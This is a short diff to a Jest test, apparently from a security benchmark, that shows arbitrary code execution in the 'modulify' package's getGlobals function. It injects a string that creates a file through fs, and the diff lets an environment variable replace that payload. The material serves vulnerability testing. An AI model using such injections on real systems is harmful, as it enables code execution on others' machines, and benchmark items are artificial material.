@@ -6,7 +6,7 @@ test("Arbitrary code execution in modulify", () => {
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(false);
   try {
-    modulify.utils.getGlobals("require(`fs`).writeFileSync(`modulify`,``)");
+    modulify.utils.getGlobals(process.env.SECBENCH_PAYLOAD || ("require(`fs`).writeFileSync(`modulify`,``)"));
   } catch (error) {}
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(true);
